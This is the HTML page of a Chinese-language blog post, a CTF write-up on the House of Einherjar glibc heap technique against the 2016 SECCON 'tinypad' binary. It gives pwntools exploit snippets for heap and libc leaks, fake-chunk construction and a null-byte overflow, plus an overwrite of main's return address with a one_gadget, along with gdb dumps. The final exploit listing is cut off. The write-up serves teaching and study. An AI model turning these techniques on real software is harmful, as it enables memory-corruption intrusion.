@@ -1,0 +1,922 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="House_Of_Einherjar pwn,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="House_Of_Einherjar 原理堆利用技术House_Of_Einherjar是由 Hiroki Matsukuma 提出。原理是利用在free堆块中的后向合并，可以将合并后的新chunk指向任意地址。前提是要能控制chunk的prev_size字段和prev_inuse字段。若能同时控制两个字断，几乎能将chunk指向任意地址。 在进行free时，会尝试前向和后向合并，后向合并的核心操">
+<meta name="keywords" content="House_Of_Einherjar pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="House_Of_Einherjar - 2016 Seccon tinypad writeup">
+<meta property="og:url" content="https://v1ckydxp.github.io/archives/2019/07/07/House_Of_Einherjar--2016-Seccon-tinypad-writeup/index.html">
+<meta property="og:site_name" content="v1cky&#39;blog">
+<meta property="og:description" content="House_Of_Einherjar 原理堆利用技术House_Of_Einherjar是由 Hiroki Matsukuma 提出。原理是利用在free堆块中的后向合并，可以将合并后的新chunk指向任意地址。前提是要能控制chunk的prev_size字段和prev_inuse字段。若能同时控制两个字断，几乎能将chunk指向任意地址。 在进行free时，会尝试前向和后向合并，后向合并的核心操">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://v1ckydxp.github.io/images/2016-seccon-tinypad/2016-seccon-tinypad-1.png">
+<meta property="og:image" content="https://v1ckydxp.github.io/images/2016-seccon-tinypad/2016-seccon-tinypad-2.png">
+<meta property="og:updated_time" content="2019-07-11T03:53:45.612Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="House_Of_Einherjar - 2016 Seccon tinypad writeup">
+<meta name="twitter:description" content="House_Of_Einherjar 原理堆利用技术House_Of_Einherjar是由 Hiroki Matsukuma 提出。原理是利用在free堆块中的后向合并，可以将合并后的新chunk指向任意地址。前提是要能控制chunk的prev_size字段和prev_inuse字段。若能同时控制两个字断，几乎能将chunk指向任意地址。 在进行free时，会尝试前向和后向合并，后向合并的核心操">
+<meta name="twitter:image" content="https://v1ckydxp.github.io/images/2016-seccon-tinypad/2016-seccon-tinypad-1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://v1ckydxp.github.io/archives/2019/07/07/House_Of_Einherjar--2016-Seccon-tinypad-writeup/">
+
+
+
+
+
+  <title>House_Of_Einherjar - 2016 Seccon tinypad writeup | v1cky'blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">v1cky'blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">few words,many deeds!</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://v1ckydxp.github.io/archives/2019/07/07/House_Of_Einherjar--2016-Seccon-tinypad-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="v1cky01dxp">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="v1cky'blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">House_Of_Einherjar - 2016 Seccon tinypad writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-07T00:00:00+08:00">
+                2019-07-07
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Post modified&#58;</span>
+              
+              <time title="Post modified" itemprop="dateModified" datetime="2019-07-11T11:53:45+08:00">
+                2019-07-11
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/二进制/" itemprop="url" rel="index">
+                    <span itemprop="name">二进制</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  2.3k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  11
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="House-Of-Einherjar-原理"><a href="#House-Of-Einherjar-原理" class="headerlink" title="House_Of_Einherjar 原理"></a>House_Of_Einherjar 原理</h3><p>堆利用技术House_Of_Einherjar是由 <code>Hiroki Matsukuma</code> 提出。原理是利用在free堆块中的后向合并，可以将合并后的新chunk指向任意地址。前提是要能控制chunk的prev_size字段和prev_inuse字段。若能同时控制两个字断，几乎能将chunk指向任意地址。</p>
+<p>在进行free时，会尝试前向和后向合并，后向合并的核心操作如下：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size(p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>也就是说后向合并时是通过prev_inuse和prev_size来定位的。如果能控制prev_size，那么就能将合并后的chunk定位到任何地址。</p>
+</blockquote>
+<p>但是在合并的过程中需要进行unlink，需要在对应chunk构造好fake chunk来绕过unlink的检测。这种利用方式和chunk extend/overlapping比较相似。</p>
+<p>具体过程如下：</p>
+<p>合并前：</p>
+<p><img src="/images/2016-seccon-tinypad/2016-seccon-tinypad-1.png" alt="2016-seccon-tinypad-1"></p>
+<p>合并后：</p>
+<p><img src="/images/2016-seccon-tinypad/2016-seccon-tinypad-2.png" alt="2016-seccon-tinypad-2"></p>
+<p><strong>PS ： </strong>只有在有堆块重用的情况下才行。</p>
+<h3 id="2016-Seccon-tiny-pad-writeup"><a href="#2016-Seccon-tiny-pad-writeup" class="headerlink" title="2016 Seccon tiny pad writeup"></a>2016 Seccon tiny pad writeup</h3><h4 id="程序基本信息"><a href="#程序基本信息" class="headerlink" title="程序基本信息"></a>程序基本信息</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_  2016_Seccon_tinypad checksec tinypad.dms</span><br><span class="line">[*] <span class="string">'/home/docker/pwnable/House Of Einherjar/2016_Seccon_tinypad/tinypad.dms'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">_  2016_Seccon_tinypad file tinypad.dms</span><br><span class="line">tinypad.dms: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=1333a912c440e714599a86192a918178f187d378, not stripped</span><br></pre></td></tr></table></figure>
+<p>程序属于64位可执行程序，开启了canary和NX 保护，动态链接。</p>
+<h4 id="程序基本功能逻辑"><a href="#程序基本功能逻辑" class="headerlink" title="程序基本功能逻辑"></a>程序基本功能逻辑</h4><p>程序主要有三个功能。新建，删除和编辑memo。memo限制个数为4个，索引从1开始。</p>
+<ol>
+<li>Add：新建一个备忘录，限制每个memo的大小不能超过256字节。新建之后会分别保存size和content指针。从<code>tinypad[16 * (index - 1 + 16LL)]</code>可知，memo存储的位置是从tinypad数组偏移256开始的，会依次存储该memo的size和memo的content指针。此外，我们可以看出，用户申请的 chunk 的大小最大为 256 字节，和 tinypad 前面的未使用的 256 字节恰好一致。</li>
+<li>Delete：删除一个备忘录，根据指定的索引删除，但是删除之后没有将content指针置为null，只是将size置为来0，存在UAF。</li>
+<li>Edit：编译备忘录，但是限制了content输入长度只能和新建的长度一样。但是在编辑前，程序会先将该memo的内容读到tinypad前256字节处。（strlen函数计算字符指针的长度，不包括空字符）</li>
+<li>read_until：程序自己实现的一个read函数，限制了不能读取00，遇到换行符结束，<code>*(_BYTE *)(a1 + i) = 0;</code>这里存在null-byte-overflow。当memo存储了256字节时，在进行edit的时候，会导致null-byte-overflow漏洞，会覆盖到第一个memo的size的最低字节。</li>
+<li>在程序开头，会依次遍历4个memo的指针是否为空，不为空就将其输出。</li>
+</ol>
+<h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><ol>
+<li><p>这里是在libc2.23版本下利用，没有tcache。首先利用UAF泄漏堆地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">40</span>     <span class="comment">#step1 : leak heap addr</span></span><br><span class="line"><span class="number">41</span>     add(<span class="number">0x70</span>,<span class="string">'a'</span>*<span class="number">8</span>)<span class="comment">#1</span></span><br><span class="line"><span class="number">42</span>     add(<span class="number">0x70</span>,<span class="string">'b'</span>*<span class="number">8</span>)<span class="comment">#2</span></span><br><span class="line"><span class="number">43</span>     add(<span class="number">0x100</span>,<span class="string">'c'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line"><span class="number">44</span></span><br><span class="line"><span class="number">45</span>     <span class="comment">#UAF</span></span><br><span class="line"><span class="number">46</span>     delete(<span class="number">2</span>)</span><br><span class="line"><span class="number">47</span>     delete(<span class="number">1</span>)<span class="comment">#now fastbin-&gt;1-&gt;2</span></span><br><span class="line"><span class="number">48</span>     p.recvuntil(<span class="string">' # CONTENT: '</span>)</span><br><span class="line"><span class="number">49</span>     data = p.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>)  <span class="comment"># get pointer point to 2</span></span><br><span class="line"><span class="number">50</span>     heap_base = u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x80</span></span><br><span class="line"><span class="number">51</span>     log.success(<span class="string">'get heap base: '</span> + hex(heap_base))</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>由于chunk1和chunk2的大小都属于fastbin范围内，所以首先释放chunk2会被放入fastbin中，fastbin是单链表，再次释放chunk 1，此时fastbin为fastbin-&gt;1-&gt;2。chunk1的fd指针指向chunk2，由于free之后并没有将指针置为null，所以输出memo1就可以泄漏memo2的堆地址。从而得到堆的基地址。</p>
+</blockquote>
+</li>
+<li><p>同样利用UAF ,泄漏libc地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">52</span>			<span class="comment">#step 2 : leak libc address</span></span><br><span class="line"><span class="number">54</span>     delete(<span class="number">3</span>)<span class="comment"># 1,2,3 will consolidate, the merged new chunk'fd = bk = unsorted bin's main_arena addr</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>因为chunk3和top chunk相邻，所以释放时不会被放入Unsorted Bin。而是直接合并到top chunk中。并且此时，fastbin中有两个空闲堆块，并且与top chunk相邻，会触发合并，fastbin-&gt;1-&gt;2，首先1会先被放入unsorted bin 中，此时chunk 1’so fd 和bk指针会指向main_arena+88(Unsorted Bin )地址。然后chunk 2和chunk 1合并成一个新的chunk 放入unsorted bin 中。这个过程并不会改变chunk 1的fd和bk指针。所以此时输出memo 1的content就会输出unsorted bin的地址，继而算出libc地址。</p>
+</blockquote>
+</li>
+<li><p>house of Einherjar ，首先在tinypad的前256字节伪造堆块。</p>
+<p>(Strcpy 函数在字符串拷贝时，遇到00会截断)，由于在进行edit的时候，会将输入的字符串先写到tinypad前0x100处，所以我们可以在这里伪造一个chunk。</p>
+</li>
+<li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>, <span class="string">'a'</span> * <span class="number">0x18</span>)  <span class="comment"># 1 这里1的最后8字节会复用2的prev_size域</span></span><br><span class="line">  <span class="comment"># we would like trigger house of einherjar at idx 1</span></span><br><span class="line">  add(<span class="number">0x100</span>, <span class="string">'b'</span> * <span class="number">0xf8</span> + <span class="string">'\x11'</span>)  <span class="comment"># 2</span></span><br><span class="line">  add(<span class="number">0x100</span>, <span class="string">'c'</span> * <span class="number">0xf8</span>)  <span class="comment"># idx 3</span></span><br><span class="line">  add(<span class="number">0x100</span>, <span class="string">'d'</span> * <span class="number">0xf8</span>)  <span class="comment">#idx 4</span></span><br><span class="line">   </span><br><span class="line">  <span class="comment"># create a fake chunk in tinypad's 0x100 buffer, offset 0x20</span></span><br><span class="line">  tinypad_addr = <span class="number">0x602040</span></span><br><span class="line">  fakechunk_addr = tinypad_addr + <span class="number">0x20</span></span><br><span class="line">  fakechunk_size = <span class="number">0x101</span></span><br><span class="line">  fakechunk = p64(<span class="number">0</span>) + p64(fakechunk_size) + p64(fakechunk_addr) + p64(</span><br><span class="line">      fakechunk_addr)</span><br><span class="line">  edit(<span class="number">3</span>, <span class="string">'d'</span> * <span class="number">0x20</span> + fakechunk)</span><br></pre></td></tr></table></figure>
+<p>此时tinypad数组前0x100的内容如下：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x602040                                                               0x602040 &lt;tinypad&gt;:     0x6464646464646464      0x6464646464646464</span><br><span class="line">0x602050 &lt;tinypad+16&gt;:  0x6464646464646464      0x6464646464646464</span><br><span class="line">0x602060 &lt;tinypad+32&gt;:  0x0000000000000000      0x0000000000000101</span><br><span class="line">0x602070 &lt;tinypad+48&gt;:  0x0000000000602060      0x0000000000602060</span><br><span class="line">0x602080 &lt;tinypad+64&gt;:  0x6363636363636300      0x6363636363636363</span><br><span class="line">0x602090 &lt;tinypad+80&gt;:  0x6363636363636363      0x6363636363636363</span><br><span class="line">0x6020a0 &lt;tinypad+96&gt;:  0x6363636363636363      0x6363636363636363</span><br><span class="line">0x6020b0 &lt;tinypad+112&gt;: 0x6363636363636363      0x6363636363636363</span><br><span class="line">......</span><br><span class="line">0x602140 &lt;tinypad+256&gt;: 0x0000000000000018      0x00000000016a6010                       0x602150 &lt;tinypad+272&gt;: 0x0000000000000100      0x00000000016a6030                      0x602160 &lt;tinypad+288&gt;: 0x0000000000000100      0x00000000016a6140                      0x602170 &lt;tinypad+304&gt;: 0x0000000000000100      0x00000000016a6250</span><br></pre></td></tr></table></figure>
+<p>要覆盖memo2的prev_size为fakechunk和memo2地址的差。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># overwrite idx 1's prev_size and</span></span><br><span class="line">  <span class="comment"># set minaddr of size to '\x00'</span></span><br><span class="line">  <span class="comment"># idx 0's chunk size is 0x20</span></span><br><span class="line">  diff = heap_base + <span class="number">0x20</span> - fakechunk_addr</span><br><span class="line">  log.info(<span class="string">'diff between idx1 and fakechunk: '</span> + hex(diff))</span><br><span class="line">  <span class="comment"># '\0' padding caused by strcpy</span></span><br><span class="line">  diff_strip = p64(diff).strip(<span class="string">'\0'</span>)</span><br><span class="line">  number_of_zeros = len(p64(diff)) - len(diff_strip)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(number_of_zeros + <span class="number">1</span>):</span><br><span class="line">      data = diff_strip.rjust(<span class="number">0x18</span> - i, <span class="string">'f'</span>)</span><br><span class="line">      edit(<span class="number">1</span>, data)</span><br><span class="line">  delete(<span class="number">2</span>)</span><br><span class="line">  p.recvuntil(<span class="string">'\nDeleted.'</span>)</span><br><span class="line">   <span class="comment"># fix the fake chunk size, fd and bk</span></span><br><span class="line">  <span class="comment"># fd and bk must be unsorted bin</span></span><br><span class="line">  edit(<span class="number">4</span>, <span class="string">'d'</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(main_arena + <span class="number">88</span>) +</span><br><span class="line">       p64(main_arena + <span class="number">88</span>))</span><br></pre></td></tr></table></figure>
+<p>此时tinypad数组前0x100内容为：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x602040</span><br><span class="line">│0x602040 &lt;tinypad&gt;:     0x6666666666666666      0x6666666666666666 </span><br><span class="line">│0x602050 &lt;tinypad+16&gt;:  0x00000000016b5fc0      0x6464646464000100                       │0x602060 &lt;tinypad+32&gt;:  0x0000000000000000      0x00000000016b60c1                     │0x602070 &lt;tinypad+48&gt;:  0x00007fb943e69b78      0x00007fb943e69b78  </span><br><span class="line">│0x602080 &lt;tinypad+64&gt;:  0x0000000000000000      0x0000000000000000                       │0x602090 &lt;tinypad+80&gt;:  0x6363636363636363      0x6363636363636363                       │0x6020a0 &lt;tinypad+96&gt;:  0x6363636363636363      0x6363636363636363                     │0x6020b0 &lt;tinypad+112&gt;: 0x6363636363636363      0x6363636363636363</span><br></pre></td></tr></table></figure>
+<p>堆块情况：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">│gdb-peda$ heapinfo </span><br><span class="line">│(0x20)     fastbin[0]: 0x0                                                              │(0x30)     fastbin[1]: 0x0  </span><br><span class="line">│(0x40)     fastbin[2]: 0x0 </span><br><span class="line">│(0x50)     fastbin[3]: 0x0</span><br><span class="line">│(0x60)     fastbin[4]: 0x0                                                               │(0x70)     fastbin[5]: 0x0 </span><br><span class="line">│(0x80)     fastbin[6]: 0x0 </span><br><span class="line">│(0x90)     fastbin[7]: 0x0                                                                │                  top: 0x1cb8350 (size : 0x20bd0 )</span><br><span class="line">│        last_remainder: 0x0 (size : 0x0)                   </span><br><span class="line">│            unsortbin: 0x602060 (size : 0x16b60c0)</span><br></pre></td></tr></table></figure>
+<p>可以看到新合并的堆块放入了unsortedbin中，并且起始地址为0x602060处。</p>
+</li>
+<li><p>覆盖main函数的返回地址为one_gadget地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fake_pad = <span class="string">'f'</span> * (<span class="number">0x100</span> - <span class="number">0x20</span> - <span class="number">0x10</span>) + <span class="string">'a'</span> * <span class="number">8</span> + p64(</span><br><span class="line">      environ_pointer) + <span class="string">'a'</span> * <span class="number">8</span> + p64(<span class="number">0x602148</span>)</span><br><span class="line">  <span class="comment"># get a fake chunk</span></span><br><span class="line">  add(<span class="number">0x100</span> - <span class="number">8</span>, fake_pad)  <span class="comment"># idx 2</span></span><br><span class="line">  <span class="comment">#gdb.attach(p)</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>这里将会把memo[1].contentptr覆盖为environ_pointer，将memo[2].contentptr覆盖为指向memo[1].contentptr指针的指针。</p>
+</blockquote>
+<p>此时tinypad数组前0x100内容为：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x602060</span><br><span class="line">│0x602060 &lt;tinypad+32&gt;:  0x0000000000000000      0x0000000000000101 </span><br><span class="line">│0x602070 &lt;tinypad+48&gt;:  0x6666666666666666      0x6666666666666666 </span><br><span class="line">|0x602130 &lt;tinypad+240&gt;: 0x6666666666666666      0x6666666666666666  </span><br><span class="line">│0x602140 &lt;tinypad+256&gt;: 0x6161616161616161      0x00007f4099845f38 ==&gt; memo1</span><br><span class="line">│0x602150 &lt;tinypad+272&gt;: 0x6161616161616161      0x0000000000602148 ==&gt; memo2</span><br><span class="line">│0x602160 &lt;tinypad+288&gt;: 0x0000000000000100      0x0000000000b03141 </span><br><span class="line">│0x602170 &lt;tinypad+304&gt;: 0x0000000000000100      0x0000000000b03250</span><br></pre></td></tr></table></figure>
+<p>接收environ 指针，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get environ addr</span></span><br><span class="line">p.recvuntil(<span class="string">' # CONTENT: '</span>)</span><br><span class="line">environ_addr = p.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)</span><br><span class="line">environ_addr = u64(environ_addr)</span><br><span class="line">main_ret_addr = environ_addr - <span class="number">30</span> * <span class="number">8</span></span><br></pre></td></tr></table></figure>
+<p>覆盖main_ret 为one_gadget 地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># set memo[0].content point to main_ret_addr</span></span><br><span class="line">edit(<span class="number">2</span>, p64(main_ret_addr))</span><br><span class="line"><span class="comment"># overwrite main_ret_addr with one_gadget addr</span></span><br><span class="line">edit(<span class="number">1</span>, p64(one_gadget_addr))</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span 